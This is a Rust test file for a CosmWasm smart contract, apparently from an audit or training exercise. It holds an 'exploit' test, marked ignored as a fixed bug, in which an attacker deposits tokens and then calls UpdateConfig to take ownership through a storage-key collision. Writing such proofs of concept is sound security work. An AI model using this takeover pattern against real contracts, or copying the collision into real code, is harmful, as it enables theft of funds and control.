#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{Uint128, Addr, coin};
    use cw_multi_test::Executor;

    use crate::{integration_tests::tests::{ mint_tokens, base_scenario}, msg::{ ExecuteMsg, ConfigQueryResponse, QueryMsg}, contract::DENOM};


    pub const ATTACKER: &str = "attacker";

    #[ignore = "fixed bug"]
    #[test]
    pub fn exploit(){
        let (mut app, contract_addr) = base_scenario();
        app = mint_tokens(app, ATTACKER.to_string(), Uint128::from(120u128));

        // Deposit topping the threshold
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(120, DENOM)], 
        )
        .unwrap();

        // Change threshold
        // Attacker can call it because the underlying storage key is the same with owner
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::UpdateConfig {
                new_threshold: Uint128::MAX,
            },
            &[],
        )
        .unwrap();

        // Check owner address
        let config: ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();

        assert_eq!(config.owner, Addr::unchecked(ATTACKER));
        assert_eq!(config.threshold, Uint128::MAX);
    }
}